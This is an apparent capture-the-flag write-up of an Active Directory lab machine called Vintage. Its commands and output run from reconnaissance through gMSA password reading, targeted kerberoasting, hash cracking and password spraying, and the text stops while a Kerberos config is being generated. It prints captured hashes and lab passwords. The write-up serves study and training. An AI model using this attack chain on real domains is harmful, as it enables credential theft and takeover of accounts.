# Vintage

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sV -sC -T4 10.10.11.45 -p- 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 11:46 EST
Nmap scan report for 10.10.11.45
Host is up (0.046s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 16:48:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62891/tcp open  msrpc         Microsoft Windows RPC
62896/tcp open  msrpc         Microsoft Windows RPC
62919/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 1s
| smb2-time: 
|   date: 2025-11-25T16:49:16
|_  start_date: N/A
```

STATUS\_NOT\_SUPPORTED, NTLM:False ⇒ we need to use kerberos

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb vintage.htb -u p.rosa -p 'Rosaisbest123'
SMB         10.10.11.45     445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.10.11.45     445    dc01             [-] vintage.htb\p.rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

We get the hostname

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb vintage.htb                                
SMB         10.10.11.45     445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
```

Now we try the kerberos auth ⇒ we need the FQDN for it to work

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.vintage.htb -u p.rosa -p 'Rosaisbest123' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123
```

Nothing interesting in the shares

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.vintage.htb -u p.rosa -p 'Rosaisbest123' -k --shares 
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```

We run bloodhound

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap dc01.vintage.htb -u p.rosa -p 'Rosaisbest123' -k --bloodhound --collection all --dns-server 10.10.11.45
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\p.rosa:Rosaisbest123 
LDAP        dc01.vintage.htb 389    DC01             Resolved collection methods: trusts, container, psremote, session, rdp, dcom, acl, objectprops, group, localadmin
LDAP        dc01.vintage.htb 389    DC01             Using kerberos auth without ccache, getting TGT
LDAP        dc01.vintage.htb 389    DC01             Done in 0M 13S
LDAP        dc01.vintage.htb 389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_dc01.vintage.htb_2025-11-25_115520_bloodhound.zip
```

We check computers with the following bloodhound query

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fmvi9CMXWMOqA3s5sSuwN%2Fimage.png?alt=media&#x26;token=b5a4eda4-fb46-4fc6-b342-80e5651ea627" alt=""><figcaption></figcaption></figure>

FS01 is part of the `PRE-WINDOWS 2000` computers. If no authentication has been made to this computer, its password should be the computer name in lowercase

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FLousu2mRFnLtvBHjciFW%2Fimage.png?alt=media&#x26;token=f63bf6e1-26bd-4b6d-b77b-d4d0027bf857" alt=""><figcaption></figcaption></figure>

We try the credentials

```shellscript
┌──(kali㉿kali)-[~/Downloads/pre2k]
└─$ nxc smb dc01.vintage.htb -u 'fs01$' -p 'fs01' -k            
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01
```

The computer can read the GMSA password of GMSA01$

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fd4vi1ZLE9PBTMUPySaXX%2Fimage.png?alt=media&#x26;token=85e8a274-4314-4a7f-ba98-e703bebf8cfd" alt=""><figcaption></figcaption></figure>

We retreive the password

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ nxc ldap dc01.vintage.htb -u 'fs01$' -p 'fs01' -k --gmsa
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\fs01$:fs01 
LDAP        dc01.vintage.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.vintage.htb 389    DC01             Account: gMSA01$              NTLM: c3e2d44f1a108288b0906a796587ddee     PrincipalsAllowedToReadPassword: Domain Computers
```

Now that we have control over the gmsa service account, we can add ourself to the service managers group

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FQMCE8yYJQAqmuRVWRTZE%2Fimage.png?alt=media&#x26;token=84344712-3728-4e81-86d0-fadd88b1d046" alt=""><figcaption></figcaption></figure>

When using bloodyAD with kerberos and passing the hash, we have to specify the format or we will get an error

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'gMSA01$' -p c3e2d44f1a108288b0906a796587ddee -f rc4 add groupMember 'ServiceManagers' p.rosa 
[+] p.rosa added to ServiceManagers
```

This group hash GenericAll overs 3 service users. None of these accounts have outbound control or are part of interesting groups, so we assume there is nothing much to do with the accounts themselves. So instead of changing the password and taking control over the account, we will attempt a kerberoasting attack, to try and get new passwords.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FSCYudWyqr6xbzlRQIC5f%2Fimage.png?alt=media&#x26;token=d7fe9087-49bc-4392-8cb7-3be1a8a5a220" alt=""><figcaption></figcaption></figure>

Add SPN's for all users

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d vintage.htb --host dc01.vintage.htb -u 'gMSA01$' -k -p c3e2d44f1a108288b0906a796587ddee -f rc4 set object svc_sql servicePrincipalName -v 'vintage.htb/meow'
[+] svc_sql servicePrincipalName has been updated

┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d vintage.htb --host dc01.vintage.htb -u 'gMSA01$' -k -p c3e2d44f1a108288b0906a796587ddee -f rc4 set object svc_ldap servicePrincipalName -v 'vintage.htb/meow2'
[+] svc_ldap servicePrincipalName has been updated
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d vintage.htb --host dc01.vintage.htb -u 'gMSA01$' -k -p c3e2d44f1a108288b0906a796587ddee -f rc4 set object svc_ark servicePrincipalName -v 'vintage.htb/meow3'
[+] svc_ark servicePrincipalName has been updated
```

Now we retrieve the hashes. We only get 2 hashes because we see that the svc\_sql account is disabled

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap dc01.vintage.htb -u 'gMSA01$' -H c3e2d44f1a108288b0906a796587ddee -k --kerberoast hashes
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\gMSA01$:c3e2d44f1a108288b0906a796587ddee 
LDAP        dc01.vintage.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        dc01.vintage.htb 389    DC01             [*] Skipping disabled account: svc_sql
LDAP        dc01.vintage.htb 389    DC01             [*] Total of records returned 2
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_ldap, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 09:45:27.881830, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb\svc_ldap*$80a4dd4feffb3a6ba7724339340bf1a5$60cc477a74d5fc84725817763dd61c9cbfa029a4e8437391e65dfec9e9209e44657d58ed233fac540bc25a5e8be95d68378676679b6625208b8a2a14988f2ac485a281d531b701f6d9344100f24551a45e5797a74038e2cfb13454f56476dcd548dc20917bb315d76a2f0c2d39810c7ba6b84c9436449a1c733d06ac6b8a39b4e9bc917da02d6c8cda8397b0f224d7c5efd68976eaf38fa3119538ea7470688c17e081445510ce6feb1bfa38bfc2d3f3947d486ffe7fbd5ab4a86f3795e888e555af33a65f4023512b880f802910c9fece1602d3b648fd418cd74102b76f3467aca0a64efc24ad8ff32f2e7b9eaabebb7a5fff89a42297a7c6657c8a8cfb2870d1afac3f34940776f5182b743c8365c4e885f2ad2696d80a2339490ab1b25b51362bbc3f3b53c24de8cf80a0d70899dcd760a0d479966364965de27de5a2cf5e5e304515aaf00c1c8c9ef1668e4ed7c6618b961f2fa9887727209771e20aa333ade81549c0297269dd6aa32c1a092991bd97a9095194a21c77514ecf9297f45dadc5a1b042413f9cf6f6e6a24cf637acc16383a63073484150753d2b4b3247d67c19d346460418d37a3b846a78cffa663459a7e5d68eb0727b74d94b1394d5d9f65ad11f81b8cfd3545c204472d583ba1d2adb92d0a407c20ba6c77f7496bf10022f1d31714d3221312f6356bc26e6a6eabebe6beb3fc3afed0e1a26b80e49d6f75c889c2b25d500f274f10cd85ebd2c079c9c3fd6232c1ac605d37050b83e2c7acf156a6d3e51d2617a1610b6a35c9b4794297f7ac5902c1e40c0764293fac2ac9043360d86b9a7439ed3ee94894e0b23993e5cd9c54088b89cc3cc942739fefe65ddca68e341573a267e4f65e7be154624554dadcb1d1f7a398ae5b55f8c1c98cc6d2b73a23a5e64fb666709a5ce16d084f1bf314312fbf3291bf4669d1a790d06cf9cbe0c9319e796143fed5055763de3549017d43f24298c445d2289eb787848d9c7244dfd10544e14ac88a85893fec252fdc5f84d40191edec939caed9fb21bf685f729480557fcac27befcfe844d7905c81e0611bd5d130605feb7f70e547e95e1603bc52f259b256812a3d8695baac9f86d4fde6d1757973f03ffe695a87f5a23150f29e884968115a8c36733a9f1ce4f6c74fbf632da61fd20d717332a590d1eb1925252ec9ff2105b69f6b231b3f7c341befc748682bf2c274a70badf124b13e7e7ae51b0aae89fd8aae1805cbac7b960e58495dccad8926d2962ef70f287409d5816a423e5cd90c2892f4caf535cdbba64251e59443f3f668f5d9ecd4f0adf1e78c8088b457d76a7ce8531ee51a1753b41dbc1ac3f306727723419fed35646c378ec6e23508598d903dd1d5c8260ae91fecc9f2b3586312019ca20a2451856ddcda55dc3fbfaa2eed38fdac78e172dbc7cdc20f893e9c7b9e1c9d92db953                                                                                                                                                                    
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_ark, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 09:45:27.913095, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb\svc_ark*$ed4518f80220c95eb8c0c6adf16d50e4$cb74b7153dbd5b0517fd5177f7e2369e162590a2b62c0c297ab857216b343047e095daafb32e1456fb7347aa872d607fc5b8dc92dfc4acc816dc6b125418c93e6651e748abf76c4977ac24aaf81fcfdafe906a75ef0107a2702c3a0ba4d027e8dcd46fcc353f8cf3341e75dfff0efcc6e312fdfa45111cc674629f4fc4cf2b99fd65274eb2e01b99e8498930a95338a4e3d66d4bc7540bd388ffad813deaec4a8bf381d173fc1689e2427b195a660fbb474d4ebcb1906d6a6cf558bce2f14b856a8ecb1f1c7109c1b408eb7e13439811e6979b2c01b7ebd0d7978ef0a43505ea4aa2c42eb5fb054f0193428dd64a9b270fb9030afe21ed39bb9f251fe5d92a4c642251a171663c1a718608c57a4c91d56d0c5a501d605490dbf015c0826585822c44a7fb11b04fc0a31b313ec14116ce7fdb117108ff8fa468ac23e0bb8631f5a9c9d416c7c1a1685dcf18e406fbd633da53c8d4991701d8ca5f5e61387f35da6f6e5835cb0fef5fde79ebdd2798b2f0bb8112bf44f93e8986205c17dfa78c3eff0770174b46f340b2faad92788ebd1a0955af77a6ee2f84593133c3bf582f712b0be63548d02c3b80d41524d95d02be39234b556bc4a41586574af804981da84741b6488d8f8caf0333f6e7004015a10a261d56c443125e99b8a75e80a0e73a417b8a114bca868c8d74239474ae3e20a0b23a3d351281979e6282651021a574abba936c0b555db88682053f562d46b346723648c83226d74f2e35bc87e339b019e2afd4b6ee22c030fb0e247c4f891bcd594cd3d6425fd53ae660c28aa14d740199268eee3761cf15f9245f01f9a371ad2d3056081962fd7f6f4ab753343ce1e3c43fc9d373c8215719a24e6bb79645419a3fd030db5edca21099db36a8644e2a4accaf9b5027f2b716e2919cee978273327dada5a07e2a62a38e6423ac9fc451af79501453db3b38a6620def73c653fb378b2e028aee4e5f1e4e7ac55933dc11ad460f2e0340e3c31349cec0a0c01e5368d3f91cd56601da338a216e0a37742ca98fe5475c66d5e95598dcacb16d11e80605dd4e7ca72e362071545311e205eb6ccbb7ae46674a8fd16c689b8aa5a795e590af0ada0d463d23668dc8e954230c5d3e97aaf1d0f1146ca6d01974fa1a495ecf37868d0487bea4816dfd3b79545ff9bcdccb3ef7b94673555289c200aeb940f16afdb1152da60000f263b1d9bb59e8c8d72475539bc55f6f5e1aa8ac9dac90c592d4505807a59ca39aa3cc54f6b7cb23b81e3c3371c829febd3d64fc71d1b1321ab514ebfd914d651548543081c33e8cfdf604fba8c130e1c5e892ae26766e9d5c820fcde7e333115762496bddc1ffd148075cb465f0f06bffa24df1f2936b601ab5f4779ec875842f17635a0970d4cc3fba845516c2f84c6627cd7b38c2efb2ab183d403ff11dc3b13a9be0a2d96941
```

We enable the account and run the command again

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -u 'gMSA01$' -d vintage.htb -p c3e2d44f1a108288b0906a796587ddee -f rc4 --host dc01.vintage.htb -k remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql userAccountControl

┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap dc01.vintage.htb -u 'gMSA01$' -H c3e2d44f1a108288b0906a796587ddee -k --kerberoast hashes                                              
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\gMSA01$:c3e2d44f1a108288b0906a796587ddee 
LDAP        dc01.vintage.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        dc01.vintage.htb 389    DC01             [*] Total of records returned 3
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_sql, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2025-11-25 22:32:07.084144, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$2dc4b70f097084c7614d266a63622a93$45d2244661e9c86fbb375b9b12d5c43c2744b28b2100d6620ad186e0e2feb34e56ee03e87863fdd2ff07e161978fb0e23e5d4fb848fed59e52a2d0a9e45a4d40a18a1d79b277b987957545897d8521395e675279161998847d2201dd06e39ed9baab3e361a0ef5eb210921a26e7596250896cc8bb9648e94fa7ed96c95f60957f2d322dffa2a381573c7b10fcf181e4b9ff87a247d603e7e58c46d5f1b13bae6038d3faf528c5db1199e7042e1c124142f7f33b82305fd0a1b3c9a513e2a9e077bed68eba0c299a1d76f9248a6cfb9f7244c6acac89d847653059ba82b28659e13fca905392914388e94b972a9c13016098cb1112fe4cb0e0d3387f353c317c32639f9c4697852eeba44b76557288d996a6214562a4a38c4b6ef0e719a9e4a2879d6b00b412cd5335adec036d5ff88e99df9eb1ad05c7b98bf218d02a0bfc2e0a2814f64c9f72adae554471873ec5df3075e7146cc2135130813d72ebb9f40e474ce67893bac07035ebd7bbe1aa25bb7eed24a4b1c557af4772a856adc2c94910984d3d834baeafcbe4cf86df81a59b2df085642634ddd3fb82aeb095bde6ae9936e15b71a916ed09b3154c1db8046842c6ebe8c5e22d55e87d0a42b6f7bacedd3fdad7fc26ff563aa239d3001d6729a51dd0841be72e7caacc05363961c25edca51b3f955da39e4b65b7311a715d472cade3ee241e0ec3c0cec843929c7b0361747476bb7ac02b495e355fbcd9fcbd816f7a1baa4791e3709b9d65907a4689d4486e8c464fe7fc0c4bebdeb0bb845ad93b03ac0f75518230f28041f32c355a3ec13d3ac80031f4005118799955f088e59e8482effbbde604e89d6a1b13ee53acf518cac3350300f96da47519c63c2dce34b4f1f4e33126068930e13b988ecee24544c17a6d2e801a65645b972c64934b66c50656273e756cc2382c882690e37d030808bb006319857b8a71eb5d4dc06d9ffefb6b6ac31cd40194df15ec274972059d5752c3eb7ddb8f0fc4a62f83d63b32180d2456021c133603f2d733c9a8b397c950a389fd38e4fcd6300571790e4fbd5dbeb8a5c18f4828a40bd57e0efe17cf294ff7e21325e5e1bc9fef548784f9750b2e3e94f3e5e995046dff673d2638f43bf86ab494edc25a4e93f8f6171f098f90b34c59f26e71facf1328a3404a6b9ede576ccb5b10212d3fdc55a855a14bc26ce6e922bd465f0e228739fd75c903f1ead77fb4ab4a4f65b36358ae551d412254a64b34492957b93fa5e22ced805a377161425d2c8ee302cf1e2ea844132ab4d51f09c63c229a1c31e70748feaba821a8cc6106ab57ffcb85c03829c7e8cafab2cabd6cfad117493c9b2d9c790536194c98b3b87a93c1bea6b4ac0e4ef092661b147b85bfdf1a3478ab3463f5cb0539354156f576b45a5dba1dfd846f0729289ab435419ff4a06a911e3c829f4490ad31d                                                                                                                                                                      
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_ldap, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 09:45:27.881830, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb\svc_ldap*$a09bc7dbd825419194db49d49d5a7416$82b65991c8fb1860102bb4b92152cab1fd323e6b23af8390393f38e2060d3e7b181f2e1c32781523c6ef7e57e25f360aab50a324aa060332c0d0a50684658629b1bb82f87779d6d7fc621f90e05ead095f9c2dbed2c98a2ad7f73f4200cb054e6652aa58776175a03ad1949b26e4a44c51c91d30bb56051e176edcb1ef350925afd41f69c293a2a30f7f3eb0fd92be99bbe0fa89cb306f15714667411aad05e6d83b34f285f5ae7e4a55bbf4a42ec528caf5f09dd16d4574c07ec1dc4bc596a2e4c78e46ef652a48d242024c5c2a88c59e239c261e492e777715fc82efa55753db8dbadd9c2637c1e37e9117b2fd3f244964c69a8199c91d33193dc5703bd5862dfd5e8d4c43acd6b1e6c41c1184bfe7fc00b1d89aa9ef75b6d2b3f6dc2e1ceb67432fad8d8adeca841060c4728ae13643d9864c6f85022db23d57371b56f96c62b5bbe4a08e9b7d3437c0d29a3e8b419b5757ce8006246be13d662ab27e9328c82db795990952d8606a71f27a222986fe0e306483ff26d8dfe7cee1b1465454f059fb2163394983e678aa5d493cc2fdfe2c30f20e672927e6b885979baf55e80765c78b4a4ace41729d8977d24adf7d5597aebc28d309c37a386fc519466722e0e778a63a6967430a8156854704f95bf8f6602ef115c8291255c6a688e98ea2d7e6338a2e2e51e0d4f5dce61337b2b40b944dca21b3760eff1525529e4d1f01af4fda8480f390388482bda7d4c5b65358dadf3496e40536631317fc470da3c8177d4574005642dd08e16bf61da92aabf02d652e5d3a92afbbcad56b45ab6c2722ba31e97bcfceae48740101667cb58dbcedff27e7b7aa4c05e93ab59d0e8df568b41d71ed85e94cba4eae3bc2d90fb8ec30967fd82a400aa44f26325f8736b2c26f46b73d66064945ac416392f7d11671f256fc03268e6faf76fff1dc083fec80f7ffa02d8ee62954d7d892657247522e2a02c4dae54e113efc277807047ac3c832bd730bf8dd8a4e726d7dea55642b1baf22cb6fa81bc674ae8011ce5bb55970172e4008a236ad1b9663dfad27ab7654e7cdee38e404df8086fd3a3172d20b0a0d86ddda6d33a0e20765bcbdd5689fbbcfae1400b3112fe0126530f9ef457a983befc994519e62a8e2626594f60268f0acc7809f8a6ae4950e71b2ee31ed8ab68943934326a4c0dc42124cbb0b0ec8fa00ac716ebb9399134700e30e53b137e28fdffc49214d3138537c6283e4e89f238a4218cf90c74dc86eafc04bc2af3bcb1d652ce509becab529a66c59b3735e12528470167b09561d7e4323b8edd9fd995f2656ad52b267b31efa6fa0b38899d17259e413369198700f3f7185ea58282f4da047bfbbfb7647db5ef7c6f998d798b97b5f1d88d4d00291fc3341bed5e7e568f22ea9ae89b0a1d976776d56c8c6269e45885f58fd7abb714aa82de878dc85e003                                                                                                                                                                    
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_ark, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 09:45:27.913095, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb\svc_ark*$b1e8b8fb062b38fcb989c680826fcff5$ce8d4f9994fca1546f46b35c3d1314138183e7abbe3837bbf9811a6462df6dcdbe2219bea060b3910b98f61dcd6cf6b82ae01a6e27d706d4f30420da7aee7ccf771cf9ee1a6d8f232945f2f7d129978760d54e6fb06d3c450880c021ebe12d22c712a6c0ffe5117e267c9995cfebc13d64437439e36aca839fd84bd5340618e0875e71627293f697ffc117dd976b874c842aca047a13719a04889ac3e4e8cf241a5acdb70c5af24d59b322d1699b3b6cd13249a54761a6004c8b5a18e2157f024f63aef843781bfb3a56ff5e964921afea84fc2d42955e81bb8269d077c7a9e5337456d853c70c0e0137bf10e5d70c41dd2824c0f960e9a1e954a59bacfd95459a5cb0d793e902f4edb34881289b1bcfcd613db22dfdd28b93ff4893d8da17a4b6a0c3a9f7c1d3ea7d429e8f2aa4d4123e7b819fa76517e80756815cab02d8036e96f81f279992b4f1b1112f9ea946351480137398b3b0e67a2b4da9ba32f4fd32abd453e2bbea5ac6314e9a839881db6ac0a4bfe176ce32d740360ec9ce988d47cb69f5c70802b45aa1f50cc33a371a2ee6751a738fcc844fe80d3f7854b9177aa41430bbf030ffb45713046555243d38a168eeebdf34c92f6fbcda21fce0f8a75eae06818d5ed6c3c97246c55c8738f36d451c6a4c99706b9bd015f0b86b2c5b3f118329683a1a726bc9aa7d37ab430c7dd6df99a1ced84f3d849ba97f539bd1df54aa344a030a50260538307b75c948cbd27543d47ff44e2cc3acfe10d0eae7f91379429fe1ce60aedbf22129eeabb68310009ba899b66a0de382f158ad31dc185d69e36f740e9c687398bed6aed126d1b776b82e02492defbf0a0202503351d0d416c693b18fab736927ed4b3220634e1213cd2f77d0a0f64cd71afa0cc6f826eca1eae00d419caecacf7f34b1edceb1855bc4fc40de9f29b803959aaac5710cee430de7955f17c2a912bb957827a793efa6db8e74214c7b523f71c0e6566729ecfe5ca4a1a7049a29ac1032af666b3199d2826425d90abc0d7894b03a6a7e4299ba18dd067fc4623b6e163ecf0dc4a375a018f55cfce05a6985e02821a55f7da46fae110c421baadc87a9a40dd86fd70c6ef3148c547d7dc06a425bc3a7a4179cfafafafd00d061a95a154d156043f831914a49c2edb4dc4014bb797b5d31c1ec29daaee00caf52c5d0b03d03f136a4da00b26e0713628638aac59e9c41c5bf1a823c29a9c2494fba960d50baf2e8db87f82dcfe4fc003e16a51ec78d039187dc53b115d375d2ac78805d5b8542b853f96cd878980bce740dd406ea07b6755fd63d6c4c81e38e2ab030feed00399cbd49d5d6ba6a3d2f1c048f38165e46885d0ab53b98f193bbab29f80b63d628faae6b1e4f98a9d210643f6caeea914ee72ff78ca8151ff2d8342e0997571e05ecc06fbc36b8913d10048089d92f88a9d9bad8
```

Now we try to crack the hashes. We get a password for the svc\_sql user

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt

svc_sql:Zer0the0ne
```

We can attempt to spray the password. We create a user list

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.vintage.htb -u 'gMSA01$' -H c3e2d44f1a108288b0906a796587ddee -k --users | awk {'print $5'} | grep -v '\[' | grep -v Username > users
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat users 
Administrator
Guest
krbtgt
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

We spray the password. We get a hit for `c.neri:Zer0the0ne`

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.vintage.htb -u users -p 'Zer0the0ne' -k --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_sql:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```

He is a member of Remote management, so we can login with winrm

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FZFigqT3GrLuLgX68zXVP%2Fimage.png?alt=media&#x26;token=78833050-4680-457b-830a-2a869e025718" alt=""><figcaption></figcaption></figure>

First, we make a kerberos configuration file

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.vintage.htb -u c.neri -p 'Zer0the0ne' -k --generate-krb5-file krb5.conf 
